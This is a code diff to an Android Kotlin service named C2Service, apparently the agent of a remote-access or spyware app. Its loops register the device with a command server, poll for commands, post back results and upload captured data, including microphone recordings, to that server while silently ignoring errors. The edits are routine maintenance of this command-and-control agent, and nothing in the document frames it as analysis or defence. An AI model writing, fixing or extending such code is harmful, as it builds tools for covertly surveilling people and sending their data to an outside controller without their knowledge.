@@ -51,7 +51,7 @@ class C2Service : Service() {
     }
 
     private suspend fun registerLoop() {
-        while (isActive) {
+        while (currentCoroutineContext().isActive) {
             try {
                 val info = DeviceInfo.snapshot(this, deviceId)
                 postJson("$serverUrl/api/agent/register", info)
@@ -61,7 +61,7 @@ class C2Service : Service() {
     }
 
     private suspend fun pollLoop() {
-        while (isActive) {
+        while (currentCoroutineContext().isActive) {
             try {
                 val body = JSONObject().put("device_id", deviceId)
                 val resp = postJson("$serverUrl/api/agent/poll", body)
@@ -91,7 +91,6 @@ class C2Service : Service() {
             .put("result", result)
         try { postJson("$serverUrl/api/agent/result", payload) } catch (_: Exception) {}
 
-        // Auto-upload for inline base64 payloads
         val dataB64 = result.optString("data_b64", "")
         if (dataB64.isNotEmpty()) {
             val category = when (type) {
@@ -100,8 +99,9 @@ class C2Service : Service() {
                 "mic_record" -> "mic"
                 else -> "misc"
             }
-            try { Uploader.uploadB64(this, serverUrl, deviceId, id, category, dataB64, "$type.jpg") }
-            catch (_: Exception) {}
+            try {
+                Uploader.uploadB64(this, serverUrl, deviceId, id, category, dataB64, "$type.jpg")
+            } catch (_: Exception) {}
         }
     }
 
